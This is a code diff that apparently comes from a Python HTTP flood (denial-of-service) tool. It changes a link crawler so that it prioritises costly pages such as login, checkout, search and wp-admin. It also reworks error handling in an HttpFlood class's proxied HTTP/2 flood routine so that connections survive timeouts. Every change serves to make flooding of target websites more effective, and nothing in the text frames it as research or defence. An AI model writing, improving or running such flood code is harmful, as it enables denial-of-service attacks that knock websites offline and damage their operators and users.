@@ -297,20 +297,25 @@ class Tools:
                 
             # Regex to find hrefs
             links = re.findall(r'href=["\'](/?.*?)["\']', html)
-            valid_paths = []
+            valid_paths = set() # [FIX] Use set for automatic dedup
             for link in links:
                 if link.startswith('http'):
                     if p.netloc in link: # Internal full URL
-                        valid_paths.append(link.replace(base, ""))
-                elif link.startswith('/'): # Relative Path
-                    valid_paths.append(link)
+                        rel_path = link.replace(base, "")
+                        if rel_path.startswith('/'):
+                            valid_paths.add(rel_path)
+                elif link.startswith('/') and len(link) > 1: # Relative Path (not just /)
+                    # [FIX] Basic cleaning of found path
+                    clean_path = link.split('#')[0].split('?')[0] # Remove fragments for crawling
+                    if clean_path and clean_path.startswith('/'):
+                         valid_paths.add(clean_path)
             
             # [PHASE 6] Heavy Path Prioritization
             heavy_keywords = ['search', 'login', 'checkout', 'cart', 'account', 'register', 'wp-admin', '?s=']
             heavy_paths = [p for p in valid_paths if any(k in p.lower() for k in heavy_keywords)]
             
             # Unique Only, with heavy paths prioritized
-            return list(set(valid_paths + heavy_paths))
+            return list(valid_paths | set(heavy_paths))
         except Exception:
             return []
 
@@ -1653,16 +1658,24 @@ class HttpFlood(Thread):
                     if not IS_RECYCLING:
                         RECYCLE_EVENT.set()
         except Exception as e:
-            # [DEBUG] Report error for diagnosis
-            if int(REQUESTS_SENT) < 100: # [FIX] Counter must be cast to int for comparison
-                 err_msg = str(e)[:100]
-                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG ERROR] H2_FLOOD: {err_msg} | Target: {clean_target_url} | Proxy: {proxy_url}")
+            # [PHASE 14] Filter common noisy errors
+            noisy_errors = {"timed out", "handshake operation timed out", "read operation timed out", "Server disconnected"}
+            err_msg = str(e)
+            is_noisy = any(ne.lower() in err_msg.lower() for ne in noisy_errors)
+
+            # [DEBUG] Report error for diagnosis (limited to non-noisy or early stage)
+            if int(REQUESTS_SENT) < 100 or not is_noisy:
+                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG ERROR] H2_FLOOD: {err_msg[:60]}... | Target: {clean_target_url}")
             
-            # If client fails, close it so it recreates next time
-            if getattr(self, '_h2_client', None) is not None:
-                try: self._h2_client.close()
-                except: pass
-                self._h2_client = None
+            # [PHASE 14] Client Persistence: Only kill on core failures, not just timeouts
+            critical_failures = {"Malformed reply", "EOF occurred", "NoneType", "protocol error", "handshake failed"}
+            is_critical = any(cf.lower() in err_msg.lower() for cf in critical_failures)
+
+            if is_critical or "socks" in err_msg.lower():
+                if getattr(self, '_h2_client', None) is not None:
+                    try: self._h2_client.close()
+                    except: pass
+                    self._h2_client = None
 
     def DOWNLOADER(self):
         payload: Any = self.generate_payload()
